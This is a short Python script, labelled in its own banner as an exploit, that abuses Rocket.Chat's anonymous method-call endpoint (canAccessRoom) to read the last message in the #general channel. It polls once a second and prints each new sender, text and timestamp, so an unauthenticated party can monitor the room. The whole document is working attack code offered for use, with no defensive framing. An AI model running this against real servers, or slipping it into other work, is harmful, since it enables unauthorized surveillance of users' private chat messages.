
import requests,sys,json
import datetime
from time import sleep

headers = {'Content-Type':'application/json','Accept':'application/json'}
url = f"{sys.argv[1]}/api/v1/method.callAnon/canAccessRoom"
user_id = sys.argv[2]

argument = {"message":"{\"msg\":\"method\",\"id\":\"59\",\"method\":\"canAccessRoom\",\"params\":[\"GENERAL\",\"" + user_id + "\"]}"}
s = True
print("""Starting the exploit
	 >>> About: Created by BugBounty Site
	 >>> What it does: This monitors #general in Rocket.Chat""")
last_message = None
while s:
	s = requests.post(url, headers = headers, data = json.dumps(argument)).json()
	message = json.loads(s['message'])
	from_user = message['result']['lastMessage']['u']['username']
	message_content = message['result']['lastMessage']['msg']
	#value = message['result']['lastMessage']['md'] or None
	time_sent = message['result']['lastMessage']['ts']['$date']
	if message_content != last_message:
		last_message = message_content
		print(f"{from_user} - {message_content} - {time_sent}")
	sleep(1)
